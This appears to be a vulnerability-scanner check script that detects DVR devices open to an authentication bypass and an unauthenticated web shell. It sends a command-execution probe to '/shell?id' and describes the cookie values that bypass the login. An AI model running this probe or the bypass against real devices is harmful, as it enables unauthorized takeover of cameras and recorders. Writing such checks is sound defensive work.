if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.111088" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2016-02-22 08:00:00 +0100 (Mon, 22 Feb 2016)" );
	script_name( "Multiple DVR Devices Authentication Bypass And Remote Code Execution Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 SCHUTZWERK GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "https://www.pentestpartners.com/blog/pwning-cctv-cameras/" );
	script_xref( name: "URL", value: "http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/" );
	script_tag( name: "summary", value: "This host is running a Digital Video Recorder (DVR)
  device and is prone to authentication bypass and remote code execution vulnerabilities.

  This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET method
  and check whether it is able to access admin panel of the device or execute remote commands." );
	script_tag( name: "insight", value: "The flaw is due to the device:

  - accepting access to the files /view2.html or /main.html if the two cookies 'dvr_usr'
  and 'dvr_pwd' have any value and the cookie 'dvr_camcnt' a value of 2, 4, 8 or 24.

  - providing an unauthenticated access to a web shell" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attacker to:

  - gain access to the administration interface of the device and manipulate the device's settings

  - execute remote commands on the base system." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
report = "";
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
buf = http_get_cache( item: "/", port: port );
if(ContainsString( banner, "erver: JAWS/1.0" ) || ContainsString( buf, "<span lxc_lang=\"index_Remember_me\">Remember me</span></p>" ) || ContainsString( buf, "Network video client</span>" )){
	url = "/shell?id";
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( buf, "uid=0(root) gid=0(root)" )){
		report += "Remote code execution, " + http_report_vuln_url( port: port, url: url ) + "\n";
		vuln = TRUE;
	}
	for file in make_list( "/view2.html",
		 "/main.html" ) {
		req = http_get( item: file, port: port );
		buf = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( buf, "<span lxc_lang=\"view_Channel\">Channel</span>" ) || ContainsString( buf, "<a id=\"connectAll\" lxc_lang=\"view_Connect_all\">" )){
			report += "Authentication bypass, " + http_report_vuln_url( port: port, url: file ) + "\n";
			vuln = TRUE;
		}
	}
}
if(vuln){
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

